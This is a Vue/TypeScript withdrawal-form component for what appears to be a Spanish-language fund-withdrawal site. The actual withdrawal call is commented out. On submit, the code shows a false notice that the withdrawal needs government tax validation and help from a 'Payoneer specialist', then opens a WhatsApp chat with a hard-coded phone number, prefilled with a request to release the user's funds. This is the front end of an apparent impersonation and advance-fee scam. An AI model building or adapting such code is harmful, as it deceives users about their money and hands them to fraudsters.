<template>
  <Autocomplete
    id="source-account"
    label="Moneda"
    :suggestions="sourceAccounts"
    :displayKey="'name'"
    placeholder="Buscar cuenta de origen..."
    mode="single"
    v-model="selectedSourceAccount"
  />

  <Autocomplete
    id="destination-account"
    label="Para"
    :suggestions="destinationAccounts"
    displayKey="accountHolder"
    placeholder="Buscar cuenta de destino..."
    mode="single"
    v-model="selectedDestinationAccount"
  />

  <Input
    label="Monto"
    id="amount"
    type="number"
    placeholder="0.00"
    v-model="transferAmount"
  />

  <!-- Dynamic Button -->
  <Button
    type="button"
    :full-width="true"
    :icon="confirmState ? 'send' : 'check'"
    @click="handleButtonClick"
  >
    {{ confirmState ? 'Retirar' : 'Confirmar' }}
  </Button>
</template>

<script lang="ts">
  import { defineComponent, ref, onMounted } from 'vue';
  import Input from '../../shared/Input/Input.vue';
  import Autocomplete from '../../shared/Autocomplete/Autocomplete.vue';
  import Button from '../../shared/Button/Button.vue';
  import { TokenService } from '../../auth/auth-jwt-service';
  import { BankAccountService } from '../Administrator/Accounts/accounts-service';
  import type { BankAccountResponseDto } from '../Administrator/Accounts/accounts.interfaces';
  import { showToast } from '../../shared/Toast/toast-service';
  import { useSweetAlert } from '../../composables/useSweetAlert.ts';

  export default defineComponent({
    name: 'TransferForm',
    components: {
      Input,
      Autocomplete,
      Button,
    },
    setup() {
      const role = ref<string>(TokenService.getClaim('role'));
      const userId = ref<number>(TokenService.getClaim('sub'));
      const transferAmount = ref<string>('');
      const confirmState = ref<boolean>(false);

      const bankAccountService = new BankAccountService();

      const body = ref<any>(null);

      const fetchBankAccounts = async () => {
        if (role.value === 'ADMIN') {
          destinationAccounts.value =
            await bankAccountService.getAllBankAccounts();
        } else {
          destinationAccounts.value =
            await bankAccountService.getBankAccountsByUserId(userId.value);
        }
      };

      onMounted(async () => {
        await fetchBankAccounts();
      });

      const sourceAccounts = ref([
        { id: 1, name: 'USD', value: 'USD' },
        { id: 2, name: 'COP', value: 'COP' },
      ]);

      const destinationAccounts = ref<BankAccountResponseDto[]>([]);

      const selectedSourceAccount = ref(sourceAccounts.value[0]);
      const selectedDestinationAccount = ref(destinationAccounts.value[0]);

      const onSubmit = async () => {
        try {
          if (!transferAmount.value || Number(transferAmount.value) <= 0) {
            showToast('El monto debe ser mayor a cero.', 'error');
            return;
          }

          if (!selectedSourceAccount.value) {
            showToast('Debe seleccionar una cuenta de origen.', 'error');
            return;
          }

          if (!selectedDestinationAccount.value) {
            showToast('Debe seleccionar una cuenta de destino.', 'error');
            return;
          }

          const selectedCurrency = selectedSourceAccount.value.value;

          body.value = {
            amount: Number(transferAmount.value),
            currency: selectedCurrency,
            accountId: selectedDestinationAccount.value.id,
          };

          // Optional: Call the withdraw service if needed
          // await withdrawService.withdraw(body.value, userId.value);

          showToast(
            'Importante: Su solicitud de retiro requiere validación adicional debido a requisitos fiscales gubernamentales. Para procesar su retiro, por favor haga clic en el botón Solicitar Contacto y un especialista de Payoneer le asistirá inmediatamente.',
            'info',
            undefined,
            10000
          );

          clearForm()
          confirmState.value = true;
        } catch (error) {
          showToast('Hubo un problema al retirar', 'error');
          console.error('Error during withdrawal:', error);
        }
      };

      const clearForm = () => {
        transferAmount.value = '';
        selectedSourceAccount.value = sourceAccounts.value[0];
        selectedDestinationAccount.value = destinationAccounts.value[0];
        confirmState.value = false;
      };

      
      const whatsapp = async () => {
        if (!body.value) {
          showToast('No hay datos de retiro disponibles.', 'error');
          return;
        }

        const { showConfirmation } = useSweetAlert();
        const isConfirmed = await showConfirmation(
          'Confirmar Retiro',
          `¿Está seguro de que desea enviar un mensaje de confirmación para el retiro de ${body.value.amount} ${body.value.currency}?`
        );

        if (isConfirmed) {
          try {
            const phoneNumber = '573138093035';
            const message = `Solicitud de retiro: Hola, buen día. Quisiera solicitar la autorización para retirar los fondos de mi cuenta digital y transferirlos a mi cuenta personal registrada. Monto: ${body.value.amount} ${body.value.currency}. Quedo atento, muchas gracias.`;
            const encodedMessage = encodeURIComponent(message);
            const sanitizedPhoneNumber = phoneNumber.replace(/\s+/g, '');
            const whatsappLink = `https://wa.me/${sanitizedPhoneNumber}?text=${encodedMessage}`;
            window.open(whatsappLink, '_blank');
          } catch (error) {
            console.error('Error opening WhatsApp link:', error);
            showToast('Hubo un problema al abrir WhatsApp.', 'error');
          }
        } else {
          showToast('El envío del mensaje fue cancelado.', 'info');
        }
      };


      
      const handleButtonClick = () => {
        if (!body.value) {
          onSubmit();
        } else if (confirmState.value) {
          whatsapp();
        }
      };


      return {
        sourceAccounts,
        destinationAccounts,
        selectedSourceAccount,
        selectedDestinationAccount,
        transferAmount,
        onSubmit,
        whatsapp,
        confirmState,
        body,
        handleButtonClick,
      };
    },
  });
</script>

<style scoped>
  @import url(./withdraw-styles.css);
</style>